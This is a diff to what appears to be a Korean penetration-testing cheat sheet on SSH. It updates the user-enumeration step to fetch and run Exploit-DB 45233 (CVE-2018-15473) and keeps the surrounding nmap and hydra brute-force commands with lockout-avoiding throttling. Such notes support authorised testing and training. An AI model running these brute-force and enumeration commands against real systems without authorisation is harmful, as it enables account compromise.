@@ -43,8 +43,10 @@ nmap -p 22 --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt <IP
 # 속도 조절 (락아웃 방지)
 hydra -l user -P rockyou.txt ssh://<IP> -t 2 -W 5
 
-# 사용자명 열거 (CVE-2018-15473 — OpenSSH < 7.7)
-python3 ssh_user_enum.py --userList users.txt --ip <IP>
+# CVE-2018-15473 OpenSSH < 7.7 사용자 열거 (EDB 45233, Python 2)
+searchsploit -m 45233
+python2 45233.py <IP> --username <user>
+python2 45233.py <IP> --userList <users.txt> --outputFile <out.txt>
 ```
 
 ---
